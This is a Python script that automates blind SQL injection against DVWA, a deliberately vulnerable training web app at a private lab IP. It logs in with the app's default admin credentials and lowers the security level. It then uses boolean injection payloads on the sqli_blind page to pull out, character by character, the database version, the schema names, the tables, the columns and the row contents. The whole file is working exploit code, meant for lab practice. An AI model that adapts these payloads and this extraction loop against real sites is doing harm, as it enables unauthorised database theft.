#!/usr/bin/env python

import requests
import time
import sys

s = requests.Session()

lista = 'abcdefghijklmnopqrstuvwxyz0123456789-._'
#lista = range(97,123)

def dvwa_login():
    url = 'http://192.168.210.130/dvwa/login.php'
    params = {'username':'admin','password':'password','Login':'Login'}
    r = s.post(url=url, data=params)
    print("\n- Logged In.")


def dvwa_security():
    url = 'http://192.168.210.130/dvwa/security.php'
    params = {'security':'medium','seclev_submit':'Submit'}
    r = s.post(url=url, data=params)
    print("- Security set to medium.")


def version():
    for i in range(1,50):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1 and length(@@version)={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\nVersion length is: " + i)
            break
    count = int(i)  
    
    print("Version: ",end='')
    version = ''
    for j in range(1,count+1):
        j = str(j)
        for c in lista:
            c = c.encode().hex()
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1 and mid(@@version,{j},1)=0x{c}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                version = version+c
                print(bytes.fromhex(c).decode('ASCII'),end='',flush=True)
 
def db_name():
    for i in range(1,50):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1 and length(database())={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\nDatabase length is: " + i)
            break
    count = int(i)  
    
    print("Database: ",end='')
    database = ''
    for j in range(1,count+1):
        j = str(j)
        for c in lista:
            c = c.encode().hex()
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1 and mid(database(),{j},1)=0x{c}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                database = database+c
                print(bytes.fromhex(c).decode('ASCII'),end='',flush=True)
                 
def databases():
    for i in range(1,50):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1 and (select count(schema_name) from information_schema.schemata)={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\n\nDatabases count: " + i)
            break
    count = int(i) 

    
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1 and length((select schema_name from information_schema.schemata limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                print(f"Length of database {tc}: " + str(i))

    db_name = ''
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1 and length((select schema_name from information_schema.schemata limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                tblLen = i
                print(f"\nDatabase {tc}: ",end='')

                for n in range(1,tblLen+1):
                    n = str(n)
                    for c in lista:
                        c = c.encode().hex()
                        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
                        params = {"id":f"1 and mid((select schema_name from information_schema.schemata limit {tc},1),{n},1)=0x{c}-- -","Submit":"Submit"}
                        r = s.get(url=url, params=params)
                        if "Surname" in r.text:
                            db_name = db_name + c
                            print(bytes.fromhex(c).decode('ascii'),end='',flush=True)


def tables():
    for i in range(1,50):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1 and (select count(table_name) from information_schema.tables where table_schema=database())={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\n\nTables count: " + i)
            break
    count = int(i) 

    
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1 and length((select table_name from information_schema.tables where table_schema=database() limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                print(f"Length of table {tc}: " + str(i))

    tbl_name = ''
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1 and length((select table_name from information_schema.tables where table_schema=database() limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                tblLen = i
                print(f"\nTable {tc}: ",end='')

                for n in range(1,tblLen+1):
                    n = str(n)
                    for c in lista:
                        c = c.encode().hex()
                        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
                        params = {"id":f"1 and mid((select table_name from information_schema.tables where table_schema=database() limit {tc},1),{n},1)=0x{c}-- -","Submit":"Submit"}
                        r = s.get(url=url, params=params)
                        if "Surname" in r.text:
                            tbl_name = tbl_name + c
                            print(bytes.fromhex(c).decode('ascii'),end='',flush=True)

def columns():
    tbl = sys.argv[2]
    tbl = tbl.encode().hex()
    for i in range(1,50):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x{tbl})={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\n\nColumns count: " + i)
            break
    count = int(i) 

    
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=0x{tbl} limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                print(f"Length of column {tc}: " + str(i))

    col_name = ''
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=0x{tbl} limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                colLen = i
                print(f"\nColumn {tc}: ",end='')

                for n in range(1,colLen+1):
                    n = str(n)
                    for c in lista:
                        c = c.encode().hex()
                        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
                        params = {"id":f"1 and mid((select column_name from information_schema.columns where table_schema=database() and table_name=0x{tbl} limit {tc},1),{n},1)=0x{c}-- -","Submit":"Submit"}
                        r = s.get(url=url, params=params)
                        if "Surname" in r.text:
                            col_name = col_name + c
                            print(bytes.fromhex(c).decode('ascii'),end='',flush=True)


def data():
    tbl = sys.argv[1]
    col = sys.argv[2]
    for i in range(1,50):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1 and (select count({col}) from {tbl})={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\n\nColumns count: " + i)
            break
    count = int(i) 

    
    for tc in range(count):
        for i in range(1,35):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1 and length((select {col} from {tbl} limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                print(f"Length of column {tc}: " + str(i))

    col_name = ''
    for tc in range(count):
        for i in range(1,35):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1 and length((select {col} from {tbl} limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                colLen = i
                print(f"\nColumn {tc}: ",end='')

                for n in range(1,colLen+1):
                    n = str(n)
                    for c in lista:
                        c = c.encode().hex()
                        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
                        params = {"id":f"1 and mid((select {col} from {tbl} limit {tc},1),{n},1)=0x{c}-- -","Submit":"Submit"}
                        r = s.get(url=url, params=params)
                        if "Surname" in r.text:
                            col_name = col_name + c
                            print(bytes.fromhex(c).decode('ascii'),end='',flush=True)


def main():
    dvwa_login()
    dvwa_security()
    if sys.argv[1] == '--version':
        version()
    if sys.argv[1] == '--db-name':
        db_name()
    if sys.argv[1] == '--databases':
        databases()
    if sys.argv[1] == '--tables':
        tables()
    if sys.argv[1] == '--columns' and sys.argv[2]:
        columns()
    if sys.argv[1] and sys.argv[2]:
        data()
if __name__=="__main__":
    main()

